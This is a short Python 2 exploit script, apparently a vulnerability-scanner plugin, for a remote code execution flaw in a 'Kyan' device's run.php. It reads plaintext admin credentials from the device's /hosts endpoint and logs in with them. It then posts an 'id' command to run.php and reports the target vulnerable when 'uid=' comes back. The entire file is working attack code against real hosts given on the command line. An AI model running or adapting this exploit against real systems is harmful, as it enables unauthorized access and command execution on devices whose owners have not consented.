#encoding:utf-8
try:
    import requests,os,sys,logging,re,urllib
    logging.basicConfig(level=logging.INFO,format="%(message)s")
except Exception as e:
    logging.info("[*] {}".format(e))
    os._exit(6)

def check(ip,port):
    target = "http://" + ip + ":" + port
    payload_getpasswd = "/hosts"
    payload_login = "/login.php"
    payload = "/run.php"                                #填写payload
    header = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": "PHPSESSID=imnpoi6mimpatfb1toahrv6dk2; MemoryTree=1|1; SpryMedia_DataTables_filesystemTable_status.php=%7B%22iStart%22%3A%200%2C%22iEnd%22%3A%204%2C%22iLength%22%3A%2010%2C%22sFilter%22%3A%20%22%22%2C%22sFilterEsc%22%3A%20true%2C%22aaSorting%22%3A%20%5B%20%5B0%2C'asc'%5D%5D%2C%22aaSearchCols%22%3A%20%5B%20%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%5D%2C%22abVisCols%22%3A%20%5B%20true%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%5D%7D"
                        }                                 #填写header头
    data = "command=id&textarea=++++++++++"                                   #填写data数据
    try:
        req1 = requests.get(url= target + payload_getpasswd,timeout=5)

        username = urllib.quote(re.search("UserName=(.*)",req1.text).group(1))
        passwd = urllib.quote(re.search("Password=(.*)",req1.text).group(1))
    except Exception as e:
        print(e)
        logging.info("[-] {} do not found Kyan_run.php_RCE".format(ip))
        os._exit(2)
    try:
        req2 = requests.post(url=target+payload_login,headers=header,data ="user="+username + "&passwd="+passwd+"&x=125&y=25" ,timeout=3,allow_redirects=True)
    except Exception as e:
        print(e)
        logging.info("[-] {} do not found Kyan_run.php_RCE".format(ip))
        os._exit(2)
    try:
        req = requests.post(url=target+payload,headers=header,data=data,timeout=10,verify=False)

        if req.status_code == 200:
            if (b'uid=' in req.text) :              #填写判断条件
                logging.info("[+] {} find Kyan_run.php_RCE".format(ip))                          #填写漏洞名
                os._exit(1)

        logging.info("[-] {} do not found Kyan_run.php_RCE".format(ip))                          #填写漏洞名
        os._exit(2)
    except Exception as e:
        logging.info("[*] {}".format(e))
        os._exit(4)

if __name__== "__main__":
    ip = sys.argv[1]
    port = sys.argv[2]
    check(ip,port)